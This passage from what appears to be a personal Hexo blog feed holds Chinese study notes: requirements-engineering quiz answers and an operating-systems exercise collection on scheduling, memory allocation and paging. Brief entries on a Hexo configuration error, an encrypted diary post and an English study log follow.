</li><li>在B方法中，（抽象机）是最基本的语法描述单元。  </li></ol><h3 id="简答-7"><a href="#简答-7" class="headerlink" title="简答"></a>简答</h3><ol><li>形式化规格说明包括哪几类？<br> 1.基于系统特性的方法；<br> 2.基于模型的方法；<br> 3.基于过程代数的方法。  </li><li>简单介绍规格说明的变换过程。<br> 1.制作形式化规格说明<br> 2.验证该规格说明的正确性<br> 3.根据变换规则将现有规格说明变换为另一种规格说明，再证明这两种规格说明再语义上等价<br> 4.重复上述过程的第2、3步，最终获得确保是正确的并可执行的程序  </li><li>简单介绍进行抽象数据类型的描述过程。<br> 1.确定所需的全部操作。在这些操作中有生成或更改类的实体操作等；<br> 2.根据各种操作的组合导出公理；<br> 3.补充一些对错误处理的特殊操作，以及追加一些非形式化的说明，以增强代数规格说明的可理解性。  </li></ol><h2 id="需求验证"><a href="#需求验证" class="headerlink" title="需求验证"></a>需求验证</h2><h3 id="选择填空-8"><a href="#选择填空-8" class="headerlink" title="选择填空"></a>选择填空</h3><ol><li>下面（    验证性）不属于需求验证内容。  </li><li>目前验证需求的方法除（形式化方法）外，主要靠人工技术审查和验证软件需求规格说明。  </li><li>需求评审就是（ 技术 ）评审，是由非软件开发人员对软件系统的进行检查以发现该系统所存在的问题。  </li><li>为需求设计测试用例的目的是确认（需求）而不能确认系统。  </li><li>用（自然语言）解释需求模型，有利于评审人员理解和评审需求规格说明。  </li><li>软件需求检测和验证理论、技术的发展，是将（可视化技术）与形式化需求验证方法相结合。  </li><li>需求验证严格地说就是检验软件需求规格说明  </li><li>需求验证非常重要，其能（发现和修复）需求规格说明书存在的问题，并避免在软件系统设计和实现时出现返工。  </li><li>需求验证要求各方人员从不同的技术角度对需求规格说明文档做出（综合性）评价。  </li><li>需求评审分为（非正式评审），正式评审两类。  </li><li>需求评审的工作就是评审（需求规格说明）的内容。  </li><li>可视化是指使用图形，图像或者图片等技术，使一些不可见的对象、表达或者抽象概念变成可见的符号。  </li></ol><h3 id="简答-8"><a href="#简答-8" class="headerlink" title="简答"></a>简答</h3><ol><li>需求验证包含哪些活动？<br> 1.软件需求规格证明是否正确描述了目标系统的行为和特征；<br> 2.从其它来源中（包括硬件的系统需求规格说明书）得到软件需求；<br> 3.需求是完整的和高质量的；<br> 4.所有人对需求的看法是一致的；<br> 5.需求为进一步的软件开发和测试提供了足够的基础。  </li><li>审查人员由哪些人员组成？<br> 1.从事软件系统需求开发的相关人员；<br> 2.具有编写需求规格说明经验和知识的人员，以及具有评审工作经验的领域专家等；<br> 3.客户或同户代表，他们可以保证需求规格说明能正确地和完整的描述他们的需求；<br> 4.将依据需求规格说明开展工作的软件开发人员，如设计人员，测试人员，项目经理等。  </li><li>审查清单可以列举哪些问题？<br> (1)需求是否完整？<br> (2)需求是否一致？<br> (3)需求是否可理解？<br> (4)需求是否明确？<br> (5)需求是否可实现？<br> (6)需求是否可跟踪？<br> (7)需求是否易于修改？<br> (8)需求规格说明文档是否完整？   </li><li>需求评审面临的困难有哪些？<br> 1.开发人员最重要的是后面的开发工作，从而导致需求评审成为“走过场” ;<br> 2.需求评审的工作量大；<br> 3.过大的评审小组。  </li></ol><h2 id="需求管理"><a href="#需求管理" class="headerlink" title="需求管理"></a>需求管理</h2><h3 id="选择填空-9"><a href="#选择填空-9" class="headerlink" title="选择填空"></a>选择填空</h3><ol><li>对所提出的多个变更请求，应由（变更控制委员会）决定实现哪些变更，以及先后次序；  </li><li>在版本控制中，每个（版本）的需求规格说明必须是独立说明的，以避免新旧版本的混淆。  </li><li>对于未获批准的变更，除进行（可行性论证）外，不应再做其后的工作；  </li><li>通过可跟踪信息可以帮助评审和确保所有需求的（可跟踪性）；  </li><li>需求管理的主要任务就是开发人员在与提出更改的请求者（用户）协商的基础上，评估需求变更带来的潜在影响及可能的（成本及费用）改变。  </li><li>为了便于管理和控制需求变更，可建立一个多个需求变更请求的（状态表），来掌握多个变更请求的实施情况。  </li><li>需求跟踪是指编制每个（需求与系统元素）之间联系（即可跟踪信息）的文档。  </li><li>对于功能扩展的变更，可以把新扩展系统的视图、（范围）以及限制等文档化，与原有对应文档进行比较，以确定取舍  </li></ol><h3 id="判断-4"><a href="#判断-4" class="headerlink" title="判断"></a>判断</h3><ol><li>需求变更只要处理好功能扩展。x  </li><li>在需求变更控制中，应建立所有需求变更要遵循的过程。√  </li><li>对于需求变更控制，有时要敢于说不。√  </li><li>版本控制需要安排专人修改。√  </li></ol><h3 id="简答-9"><a href="#简答-9" class="headerlink" title="简答"></a>简答</h3><ol><li>需求管理的主要工作内容有哪些？<br> 1）控制对基准需求规格说明的变动；<br> 2）保持项目计划与需求一致；<br> 3）控制单个需求的更改和需求规格说明文档的更改；<br> 4）管理需求和需求间的联系，以及需求与设计和实现等方面的依赖关系；<br> 5）跟踪需求更改的状态，控制多个需求同时更改的复杂性。  </li><li>需求变更会带来哪些问题？<br>需求变更通常会带来一系列的问题，如需求间的影响（即当一个需求更改后对其它需求的影响），需求更改对设计和实现的影响等。  </li><li>可跟踪信息有哪些类别？<br> (1)需求—源可跟踪性<br> (2)需求—理由可跟踪性<br> (3) 需求—需求可跟踪性<br> (4)需求—体系结构可跟踪性<br> (5)需求—设计可跟踪性<br> (6)需求—用户界面可跟踪性   </li><li>变更控制的结束条件有哪些？<br> 1、变更被拒绝、正常处理或中途取消；<br> 2、所有修改后的产品能正常运行；<br> 3、相关的文档已被修改并有新版本要求；<br> 4、有关更改的信息记录到更改库中。  </li></ol><h2 id="面向软件行为和视点的建模技术"><a href="#面向软件行为和视点的建模技术" class="headerlink" title="面向软件行为和视点的建模技术"></a>面向软件行为和视点的建模技术</h2><h3 id="选择填空-10"><a href="#选择填空-10" class="headerlink" title="选择填空"></a>选择填空</h3><ol><li>在视点标识中，需要确定每个视点源对问题子域的（关注点）。  </li><li>下列（需求生存周期管理）不属于视点管理内容。  </li><li>行为树（图）体现了行为描述语言的（语法结构）。  </li><li>研制一个软件系统，正确的方法应该是将问题按先后次序进行（ 分解），然后每一步集中解决某个问题，直至所有问题都被解决。  </li></ol><h3 id="判断-5"><a href="#判断-5" class="headerlink" title="判断"></a>判断</h3><ol><li>软件行为的正确与否决定了软件能否满足用户需求。√  </li><li>为获取复杂系统的高质量和可信需求模型，需根据不同的用户视点建立系统的需求模型。√  </li><li>行为的主体与客体都必须是确定的。x  </li><li>视点检测时，可以从语法的角度检测视点的行为表达式的正确性。√  </li></ol><h3 id="简答-10"><a href="#简答-10" class="headerlink" title="简答"></a>简答</h3><ol><li>划分问题域的具体步骤？<br> （1）开发人员与客户、应用（问题）领域专家等对问题进行交流；<br> （2）确定待开发系统问题域的边界；<br> （3）将系统按照合理的方式划分成多个问题子域；<br> （4）在系统中新建或增添问题子域名。在问题子域名被建立后通常不允许再被修改，否则必须修改所有与该问题子域相关的信息。  </li><li>视点生存过程管理内容包括？<br> 1、视点的创建<br> 增加一条视点记录，部分信息槽要系统员输入，一个视点只由一个用户建立并维护。<br> 2、视点的修改<br> 只能由增加者修改，其中包括系统信息与用户信息，分别由管理者与用户修改；<br> 需求描述、场景描述与行为模型具有依赖关系。<br> 3、视点的删除<br> 用户自己删除，并删除相关的信息，记入日志<br> 4、视点的查询<br> 根据权限查询。  </li><li>简单介绍研究软件行为的一般方法。<br> （1）如何根据自然语言描述的需求，建立相应场景信息；<br> （2）如何根据场景信息抽取与行为相关的信息，并利用行为描述语言建立行为表达式；<br> （3）如何建立行为描述语言的语义模型，为检验复杂系统的各种特性奠定基础；<br> （4）如何利用模型检验方法和技术检测复杂系统的一些特性。  </li><li>视点间关系有哪些？<br> 视点间关系是指两个视点之间在问题域或者需求信息方面的联系。<br> 重叠关系：指两个视点的视点源的观察领域存在一定程度的重合，其包括两种情况：部分重合和完全重合。<br> 顺序关系：指两个视点在行为方面存在着先后关系，如两个视点间存在着传递信息的行为等。<br> 无关系：指两个视点在观察领域上不存在重合，并且不具备行为上的先后关系，如两个并行的视点等。  </li><li>复杂系统<br> 复杂系统是一个抽象概念，通常指规模大且内部逻辑关系复杂、涉及相关人员较多的软件系统。  </li><li>视点<br> 一个观察者（视点源）根据其关注点和某个问题域而提出的需求信息的集合构成一个视点。  </li><li>软件行为<br> 软件的行为是指软件运行时作为主体，依照自身的功能对客体的施用、操作或动作的过程，或主体施用一个服务、操作或动作于客体。<br> 软件的行为由行为主体和客体、操作或动作、行为输入/出和行为属性等组成。  </li><li>问题域<br> 所谓问题域是指与问题相关的部分现实世界，问题域和问题相互依存，问题处于一定的问题域之中，脱离了问题域，问题就无法存在。  </li></ol><h2 id="面向问题域的需求分析"><a href="#面向问题域的需求分析" class="headerlink" title="面向问题域的需求分析"></a>面向问题域的需求分析</h2><h3 id="选择填空-11"><a href="#选择填空-11" class="headerlink" title="选择填空"></a>选择填空</h3><ol><li>软件问题的本质是配置的（ 机器 ）M，在相关的域D内，产生了期望的效果R。  </li><li>问题域是与问题相关的（ 部分）现实世界。  </li><li>并行划分是将每个子问题看成是整个问题的一个（ 投影）。  </li><li>问题框架是一种（ 模式 ），它捕获并定义了常见的简单子问题的类型。  <h3 id="判断-6"><a href="#判断-6" class="headerlink" title="判断"></a>判断</h3></li><li>信息显示问题框架是要建立一个机器，让该机器从客观世界中获得相关信息，并按所要求的格式呈现在所要求的地方。√  </li><li>在PDOA中，采用上下文图来进行问题域的界定。x  </li><li>问题图可以描述域与域之间的关系。√  </li><li>两个问题框架实例在形式上相互关联是指它们所对应的问题图之间相互关联。√  </li></ol><h3 id="简答-11"><a href="#简答-11" class="headerlink" title="简答"></a>简答</h3><ol><li>简单介绍PDOA方法的分析步骤。  <ol><li>搜集需求信息，界定和描述问题及问题域；   </li><li>划分问题域并开发相关问题框架；   </li><li>根据问题框架的类型进一步描述问题域的相关特性。  </li></ol></li><li>变换问题框架的基本思想是什么？<br>存在一些计算机可读的输入文件，其数据必须被变换以给出所需要的特定输出文件，输出数据必须遵守特定的格式，并且必须按照特定的规则从输入数据中导出。问题是要建立一个机器，该机器从输入中产生所需要的输出。  </li><li>问题与问题域之间的相互关系？<br>问题域和问题相互依存，问题处于一定的问题域之中，脱离了问题域，问题就无法存在。问题域也是与特定的问题相关的现实世界，脱离特定的问题考虑纯粹的问题域没有任何意义。  </li><li>简单介绍问题域的划分步骤。<br> 1、确定系统所需的各项功能；<br> 2、若某些（或个）功能对应于一个足够小的具体实现单元，则由该实现单元直接实现这些（或个）功能；<br> 3、否则，把功能分解为一系列子功能，并重复步骤2和3，直到所有子功能可分别对应一个足够小的具体实现单元。  </li></ol><h2 id="面向多视点的需求工程"><a href="#面向多视点的需求工程" class="headerlink" title="面向多视点的需求工程"></a>面向多视点的需求工程</h2><h3 id="选择填空-12"><a href="#选择填空-12" class="headerlink" title="选择填空"></a>选择填空</h3><ol><li>（视点 ）是一个形式化的部分规格说明。  </li><li>多视点就是在客观分析若干（视点）的内、外部关系的基础上对其进行有机的整理和综合。  </li><li>视点标识的主要任务是确定（视点源）；  </li><li>（不一致性 ）是群体协作活动中不可避免的一种特性。  </li><li>视点的一致性与（ 视点）的表示方法密切相关。  </li><li>视点的（集成）是多视点需求工程过程的最后一个阶段。  </li><li>视点是服务的（ 接收者 ），这些服务可被看作系统的需求。  </li><li>视点间的不一致可以分为（静态约束 ）与动态交互两类。  </li></ol><h3 id="判断-7"><a href="#判断-7" class="headerlink" title="判断"></a>判断</h3><ol><li>视点间关系的类型及性质与视点的标识方法与视点表示方法密切相关。√  </li><li>静态约束又分为数据上的约束与结构上的约束。x  </li><li>基于规则一致性处理先要定义好视点内部和视点间的一致性规则。√  </li><li>如何进行一致性检查和不一致性处理，是视点表示阶段的主要任务。x  </li></ol><h3 id="简答-12"><a href="#简答-12" class="headerlink" title="简答"></a>简答</h3><ol><li>简单介绍面向多视点需求工程的意义。<br>对于大型、复杂软件系统的开发，不可避免的涉及众多项目相关人员，由于各自背景、知识和职责等的不同，不同项目相关人员对目标软件系统可能具自不同的看法和要求，通常，这些看法和要求可能是不全面，不完整的，甚至可能相互矛盾。此外，对于分布式系统或涉及复杂问题领域的系统，由于各项目相关人员方面在地理上可能分布于各处，另一方而可能仅关注整个问题的某个部分，且常以并行的方式提出他们各自的看法和要求。为确保最终开发的软件系统能完整地满足各方面用户的要求。必须在系统开发的早期采用有效的方法来全面地获取不同用户的需求。防止用户重要需求信息的遗漏，同时还必须对不同用户的需求进行系统的检查和分析，发现并协调其中可能存在的不一致，最終形成完整和一致的需求规格说明。  </li><li>谈谈面向多视点的需求工程方法的优势。<br> 1、复杂系统的本质特性与多视点思想吻合，利用多视点需求工程方法可以有效地减少某些重要需求被遗漏的可能性，从而保证了需求规约的完备性；<br> 2、每个视点只需关心它自己感兴趣的内容，不需或较少地考虑其它因素的影响，从而有效地降低了需求获取和描述的难度，有利于提高整个需求工程的质量；<br> 3、视点的形式使软件系统以一种更加结构化的形式被描述，从而为自动化的完备性和一致性检查提供了可能性；<br> 4、多视点为封装软件系统的不同描述模型提供了一个强而有力的手段；<br> 5、通过把需求和表达需求的视点关联起来，可增强需求的可追踪性。  </li><li>简单介绍常用的视点表示方法。<br> 1、A. Finkelstien采用模板的形式表示每个视点的内容及与其它视点的关系。<br> 2、I.Sommerville在其VORD方法中以框架结构的形式来表示视点。<br> 3、RM-ODP中除声明了五种类型的视点外，也对描述每种类型视点的语言应具有什么样的特征进行了定义。<br> 4、概念图、Z、LOTOS、一阶逻辑等。  </li><li>常有的一致性处理方法有？<br> 1、基于规则型:基于预先定义好的视点内部和视点间的一致性规则，以及一致性检查过程模型，这些规则和过程模型由视点模板的设计者根据该模板的用途进行定义。<br> 2、基于逻辑型:用一阶逻辑作为不同规约语言的语义域模型，然后从逻辑的角度定义和检查视点内部及视点间的一致性。<br> 3、基于可实现型:以变换系统作为不同视点规格说明的公共语义模型，由于该变换系统包括静态结构、动态行为及体系结构等多方面的内容，故可作为多种不同类型规约语言的公共语义模型，克服了采用一阶逻辑作为公共语义模型的不足。  </li></ol><h2 id="需求工程与软件开发管理"><a href="#需求工程与软件开发管理" class="headerlink" title="需求工程与软件开发管理"></a>需求工程与软件开发管理</h2><h3 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h3><ol><li>在用户与软件开发方正式签订的软件开发合同中，大部分估算是依赖（经验 ）而不是依据什么严格的标准和模型而得到的。  </li><li>基于软件生命期模型的估算方法（准确性比较差）。  </li><li>基于需求的软件规模估算是从（需求规格说明）文档中预估整个软件系统的规模。  </li><li>基于需求的工作量估算主要是从需。求中预测代码行、（功能点）或图形界面的数量等估算整个项目的工作量。  </li></ol><h3 id="判断-8"><a href="#判断-8" class="headerlink" title="判断"></a>判断</h3><ol><li>需求工程对软件开发管理影响比较大，但对软件开发过程没有什么影响。x  </li><li>在用户与软件开发方正式签订的软件开发合同中，无需进行软件的开发预算和开发进度安排等估算，通常是在需求分析后再进行这些估算。x  </li><li>由于对项目的需求与规模不了解，通常在项目规划上会出现问题。√  </li><li>在基于需求的软件规模估算中，通常假设软件规模与需求规格说明的规模成正比。√  </li></ol><h3 id="简答-13"><a href="#简答-13" class="headerlink" title="简答"></a>简答</h3><ol><li>简单介绍基于需求的工作量估算方法。<br>对于已知规模的软件，如果令l表示软件规模，N表示开发人数，q表示平均生产效率时，则整个项目的开发时间T为:T=l/(q*N)。<br>如果知道N个人的平均开销的话，则可以由T×N算出该项目的成本。此处，把T×N也称为人月。   </li><li>简单介绍开发进度安排出现问题的主要原因。<br> 1)不了解项目的需求与规模。<br> 2)低估了花费的工作量和时间。<br> 3)没有考虑返工，特别是用户需求的变化等因素所需的时间。  </li><li>简单介绍基于需求的软件规模估算中，多人估算步骤及方法。<br> 1、首先划分开需求规格说明，例如分为3个部分；<br> 2、由3人分别根据3个部分需求规格说明估算软件的规模；<br> 3、由3人同时根据一部分需求规格说明估算软件的规模；<br> 4、然后得出估算的结果，并估算整个软件的规模。<br> <img src="/images/rjgc1.png" alt="tupian" loading="lazy">  </li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件需求工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo错误</title>
      <link href="/2020/CS/hexo%E9%94%99%E8%AF%AF/"/>
      <url>/2020/CS/hexo%E9%94%99%E8%AF%AF/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h2><ol><li><code>Error: EPERM: operation not permitted, unlink &#39;D:\Learn\blog\db.json&#39;</code><br>解决： 配置文件的<code>:</code>后没有加空格，呕</li><li>部署到云服务器</li><li>修改云服务器的默认地址<br>apache:<code>/etc/apache2/site_enabled/000-xxx.conf</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统错题集</title>
      <link href="/2020/learning/2019-2020s/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%94%99%E9%A2%98%E9%9B%86/"/>
      <url>/2020/learning/2019-2020s/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%94%99%E9%A2%98%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<!--more-->  <h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><ol><li>进程被创建后即进入（ <strong>就绪</strong> ）排队。  </li><li>一个作业处于运行状态，则所属该作业的进程可能处于（ 运行、就绪或等待 ）状态。<br>一个作业处于运行状态，只说明该作业已进入到内存中，并以进程形式存在于系统中，属该作业的进程可能处于运行、就绪或等待状态。  </li><li>下列叙述中，正确的是：<font color="red">BDE</font><br>A、作业一旦被作业调度选中，即占有了CPU<br><font color="red">B、批处理系统对作业的控制意图是靠作业说明书来实现的，用户不能控制作业的执行</font><br>C、在各种作业调度算法中，短作业优先调度算法会使每个作业的等待时间最短<br><font color="red">D、作业一旦被作业调度选中，该作业即进入内存</font><br><font color="red">E、允许多个用户在各自的终端上同时交互地使用计算机的系统称为分时操作系统</font>    </li></ol><h2 id="存储管理"><a href="#存储管理" class="headerlink" title="存储管理"></a>存储管理</h2><ol><li><p>某系统有1MB内存，使用伙伴系统实现内存管理，请求分别为50K、150K、90K、130K、70K、80K、120K、180K、60K，其中因为内部碎片而浪费的内存大小是：</br><font color="red">有一个64K的内存块未分配却不可用，所以<strong>外部碎片是64K</strong>。在剩下的1024K-64K=960K的分配空间中，只有50K+150K+90+130K+70K+80K=570K是被请求的，120k及以后的都没有被分配。所以有960K-570K=390K空间由于内部碎片而被浪费。</font><br><img src="/images/os1-1.png" alt="os" loading="lazy">  </p></li><li><p>段式虚拟存储器的最大容量是：<font color="red">由指令的地址结构和外存容量决定的</font>  </p></li><li><p>在段页式存贮管理系统中，若采用直接地址转换，为访问一内存数据，至少要访问主存的次数为<font color="red">3次<br/>第一次是查段表，得到该段的页表的起始地址，第二次是按得到的页表地址查页表，最后一次是按转换后的实际地址访问内存。</font>  </p></li><li><p>某系统有32位虚拟地址空间，且页大小是1024B。每个页表项长4字节，因为每个页表都必须包含在一页中，所以使用多级页表，共需要多少级页表？</br><font color="red">一张页表包含2^10/2^2即2^8个页表项，逻辑地址一共32位，页数一共2^22,每一级页表能处理22位中的8位，所以共需要3级因此级数=22/8+1=3</font>  </p></li><li><p>某一个段式虚拟存储器中，进程1、2的基址寄存器分别保存的是0、3，地址变换表如下所示，进程2的虚拟地址（1，15）的物理地址是(<font color="red">715</font>)。    </p><table><thead><tr><th>段号</th><th>起始基址</th></tr></thead><tbody><tr><td>0</td><td>40</td></tr><tr><td>1</td><td>90</td></tr><tr><td>2</td><td>150</td></tr><tr><td>3</td><td>400</td></tr><tr><td>4</td><td>700</td></tr></tbody></table><p><font color="red">段表的起始地址由段表基址寄存器给出。<br>基址寄存器为3，虚拟地址给定的段号为1，由此可计算物理地址的段号为3+1=4，查表得到第4段的起始基址为700，给定的段偏移量为15，因此物理地址为：700+15=715。</font><br><font color="navy">错误原因：不知道基址寄存器是干嘛的</font>  </p></li><li><p>有一个多道批处理系统，作业调度采用“短作业优先”调度算法，进程调度采用“优先数抢占式”调度算法，且优先数越小则优先级越高。如系统拥有一台打印机，采用静态方法进行分配，忽略系统调度开销。现有以下作业序列到达系统<br>（1）根据表格内容求出各个作业的周转时间和带权周转时间。<br>（2）说明各个作业运行结束的先后次序。  </p><table><thead><tr><th>作业名</th><th>到达时间</th><th>CPU运行时间</th><th>打印机需求</th><th>优先数</th></tr></thead><tbody><tr><td>Job1</td><td>14:00</td><td>40</td><td>1</td><td>4</td></tr><tr><td>Job2</td><td>14:20</td><td>30</td><td>0</td><td>2</td></tr><tr><td>Job3</td><td>14:30</td><td>50</td><td>1</td><td>3</td></tr><tr><td>Job4</td><td>14:50</td><td>20</td><td>0</td><td>5</td></tr><tr><td>Job5</td><td>15:00</td><td>10</td><td>1</td><td>1</td></tr></tbody></table><p>答案:<br><img src="/images/os6-1.png" alt="os" loading="lazy">  </p><div style="color:red">（1）周转时间分别为： 70,30,100,100,20<br>带权周转时间分别为：1.75，1，2,5,2<br>（2）结束的先后次序为job2，job1，job5，job3，job4   <div style="color:navy">解：1、静态分配：一旦分配，不能抢占，直到进程使用完毕释放结束;也就是说打印机资源不能被抢占。<br>2、作业调度：与内存大小有关，本题没有给定条件，所以只需考虑进程调度；<br>3、几个计算公式：<br>完成时间＝开始时间＋服务时间<br>周转时间＝完成时间－到达时间<br>带权周转时间＝周转时间/服务时间   </div></div><br>  <table><thead><tr><th>作业名</th><th>到达时间</th><th>CPU运行时间</th><th>打印机需求</th><th>优先数</th><th>开始时间</th><th>结束时间</th><th>周转时间</th><th>平均周转时间</th></tr></thead><tbody><tr><td>Job1</td><td>14:00</td><td>40</td><td>1</td><td>4</td><td>14:00</td><td>15:10</td><td>70</td><td>1.75</td></tr><tr><td>Job2</td><td>14:20</td><td>30</td><td>0</td><td>2</td><td>14:20</td><td>14:50</td><td>30</td><td>1</td></tr><tr><td>Job3</td><td>14:30</td><td>50</td><td>1</td><td>3</td><td>15:20</td><td>16:10</td><td>100</td><td>2</td></tr><tr><td>Job4</td><td>14:50</td><td>20</td><td>0</td><td>5</td><td>16:10</td><td>16:30</td><td>100</td><td>5</td></tr><tr><td>Job5</td><td>15:00</td><td>10</td><td>1</td><td>1</td><td>15:10</td><td>15:20</td><td>20</td><td>2</td></tr></tbody></table></li><li><p>在一个请求分页系统中，整数占4B，页大小为256B，使用最近最少使用页面替换算法，每个进程分配3个页框。一个进程执行下列代码：  </p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span>a<span class="token operator">=</span><span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span>  <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">++</span><span class="token operator">&lt;</span><span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>   <span class="token keyword">while</span> <span class="token punctuation">(</span>j<span class="token operator">++</span><span class="token operator">&lt;</span><span class="token number">200</span><span class="token punctuation">)</span>     a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码占用页0，由于每条指令都访问页0，所以页0总是换入。便利那个i和j都存储在联想寄存器中。<br>计算并回答：<br>（1）假设数组的所有元素都存储在连续内存区域中，那么，数组需要多少页？<br>（2）程序将产生多少个缺页？  </p><div style="color:red">解：（1）数组有200×200=40 000个元素，每个元素需要4B存储空间，则总共需要4*40 000=160 000B，即占用625页。<br>（2）程序按数组元素存储顺序访问数组，所以，它先换入指令页1次。之后625个数据页每页都对应一次换入，故总共是626次换入。</div>  </li><li><p>在一个采用段页式存储方式的系统中，有16位虚地址空间，每个进程有2个段，页的大小为2^12B。段页表的内容如下表所示(表中数字均为二进制数)，并且段长以页为单位。  </p><table><thead><tr><th>段号</th><th>页表起始地址</th><th>长度</th></tr></thead><tbody><tr><td>0</td><td>指向页表0的指针</td><td>100</td></tr><tr><td>1</td><td>指向页表1的指针</td><td>101</td></tr></tbody></table><p>页表0  </p><table><thead><tr><th>页号</th><th>页框</th><th>存在位</th></tr></thead><tbody><tr><td>000</td><td>001100</td><td>1</td></tr><tr><td>001</td><td>011101</td><td>1</td></tr><tr><td>010</td><td>100110</td><td>0</td></tr><tr><td>011</td><td>001010</td><td>1</td></tr><tr><td>100</td><td>111010</td><td>1</td></tr><tr><td>101</td><td>110110</td><td>0</td></tr><tr><td>110</td><td>101011</td><td>0</td></tr><tr><td>111</td><td>001011</td><td>0</td></tr></tbody></table><p>页表1  </p><table><thead><tr><th>页号</th><th>页框</th><th>存在位</th></tr></thead><tbody><tr><td>000</td><td>010100</td><td>1</td></tr><tr><td>001</td><td>110101</td><td>0</td></tr><tr><td>010</td><td>110100</td><td>1</td></tr><tr><td>011</td><td>011001</td><td>1</td></tr><tr><td>100</td><td>001001</td><td>1</td></tr><tr><td>101</td><td>110011</td><td>0</td></tr><tr><td>110</td><td>000101</td><td>0</td></tr><tr><td>111</td><td>100010</td><td>0</td></tr></tbody></table><div style="color:red">根据题意可知，虚地址的结构如下：1位段号+3位页号+12位页内偏移量 <br>  (1)把虚地址0x1457 = 00010100 01010111划分为0,001,0100 01010111，它应在段0页001中，且001≤100，该页在内存中，对应的物理地址为：011101010001010111（或十六进制：1D457，或十进制：119895）。<br>(2)把虚地址0x44FF =01000100 11111111划分为0,100,0100 11111111，它应在段0页100中，且100≤100，该页在内存中，对应的物理地址为：111010010011111111（或十六进制：3A4FF，或十进制：238847）。<br>(3)把虚地址0xB4C7=10110100 11000111划分为1,011,0100 11000111，它应在段1页001中，且001≤101，该页在内存中，对应的物理地址为：011001010011000111（或十六进制：194C7，或十进制：103623）。<br>(4)把虚地址0xE2C7=11100010 11000111划分为1，110，0010 11000111，它应在段1页110中，但110≥101，所以出现缺段故障。</div>  </li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-5-6</title>
      <link href="/2020/diary/2020-5/2020-5-6/"/>
      <url>/2020/diary/2020-5/2020-5-6/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="89b8feac7f9d2a2b8834ff6654255ade63d4da9ac5d986befbf59801a29860f2">e32c27e47419b87d293b9e8ce412adf8a88206147a5c4a365bbc03504941a61e809495e8a3b764e360bc6d0936b5de5b350fe647126be2d6be56852d5c195337e28991ec0b459a9303c07b0176654959dcc35ee895cabac9d76473f1cbdfdfb1ee750b590d3a038011b410644dec0d1a23083d6a52401a975d2b8d4c6d87e25d90e5cc5499ad462e1afefc0d53ec9dfe523013a43b5884abf0e2c03cbc3afb9fbb464f6a0426b6cebcea13d4841441a68a8c4c9616767552bebe68371993e06d8c8f2c33548e6309e756f896a1dd6b0638a3632b4c501e836baa94140d2d5ad10348840d3e4fef07c04f796491d5d52202a60a4f49af26c7b1e69f7d7d14dc49351d010e4baecf103fb35148c4eb6fcbe97f2b72be2c2aa9111d281c88c27c5fbfe47c8471773615c4cfc8dba2bacf84</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>record</title>
      <link href="/2020/English/record/"/>
      <url>/2020/English/record/</url>
      
        <content type="html"><![CDATA[<!--more--><p>好想做一次 E3<br>摩登家庭S1E4</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>好想做一次</title>
      <link href="/2020/English/%E5%A5%BD%E6%83%B3%E5%81%9A%E4%B8%80%E6%AC%A1/"/>
      <url>/2020/English/%E5%A5%BD%E6%83%B3%E5%81%9A%E4%B8%80%E6%AC%A1/</url>
      
